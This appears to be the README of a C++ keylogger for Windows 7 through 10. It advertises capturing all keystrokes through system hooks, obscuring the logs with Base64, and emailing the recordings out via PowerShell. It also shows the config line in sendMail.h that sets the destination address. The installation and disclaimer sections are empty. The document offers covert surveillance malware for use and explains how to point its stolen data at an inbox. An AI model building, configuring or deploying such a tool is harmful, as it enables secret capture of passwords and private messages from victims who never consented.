# Keylogger C++ 11
  This is a windows process which works on Windows 7,8,8.1 and 10.

## Features
  This Keylogger runs on bare minimum resources. (only needs c++ 11 which is installed on all versions of windows by default)
  Capture all keystrokes using system hooks
  Creates log files with time and date
  Uses Base64 encoding to make logfiles unreadable
  Emails the recording of the keystrokes using widows Powershell

## Prerequisites
  C++ 11 is the only prerequisite.

## Changes to make
  In sendMail.h
  Edit line 16 for where the log should be sent from (default: gmail only, look at Other Emails section for changing that)
  ```pyhton
  #define X_EM_TO "our.destination@email.address" // change the string to source email
  ```
## installing

## Desclaimer
